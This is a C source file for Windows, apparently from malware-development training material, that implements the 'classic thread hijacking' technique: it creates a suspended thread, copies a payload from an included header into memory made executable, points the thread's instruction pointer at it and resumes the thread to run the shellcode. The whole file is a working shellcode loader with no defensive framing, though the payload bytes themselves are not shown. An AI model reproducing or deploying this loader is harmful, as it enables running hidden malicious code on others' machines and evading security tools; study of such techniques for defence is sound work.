#include <Windows.h>  
#include <stdio.h>  
#include "payload.h"

// Dummy function definition to resolve the undefined identifier error  
DWORD WINAPI DummyFunction(LPVOID lpParam) {  
   return 0;  
}  

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {  

   PVOID    pAddress = NULL;  
   DWORD    dwOldProtection = NULL;  
   CONTEXT  ThreadCtx = {  
       .ContextFlags = CONTEXT_CONTROL  
   };  

   // Allocating memory for the payload  
   pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);  
   if (pAddress == NULL) {  
       printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());  
       return FALSE;  
   }  

   // Copying the payload to the allocated memory  
   memcpy(pAddress, pPayload, sPayloadSize);  

   // Changing the memory protection  
   if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {  
       printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());  
       return FALSE;  
   }  

   // Getting the original thread context  
   if (!GetThreadContext(hThread, &ThreadCtx)) {  
       printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());  
       return FALSE;  
   }  

   // Updating the next instruction pointer to be equal to the payload's address   
   ThreadCtx.Rip = (DWORD64)pAddress;  

   // Updating the new thread context  
   if (!SetThreadContext(hThread, &ThreadCtx)) {  
       printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());  
       return FALSE;  
   }  

   return TRUE;  
}  

int main() {  

   HANDLE hThread = NULL;  

   // Creating sacrificial thread in suspended state   
   hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);  
   if (hThread == NULL) {  
       printf("[!] CreateThread Failed With Error : %d \n", GetLastError());  
       return FALSE;  
   }  

   // Hijacking the sacrificial thread created  
   if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {  
       return -1;  
   }  

   // Resuming suspended thread, so that it runs our shellcode  
   ResumeThread(hThread);  

   printf("[#] Press <Enter> To Quit ... ");  
   getchar();  

   return 0;  
}
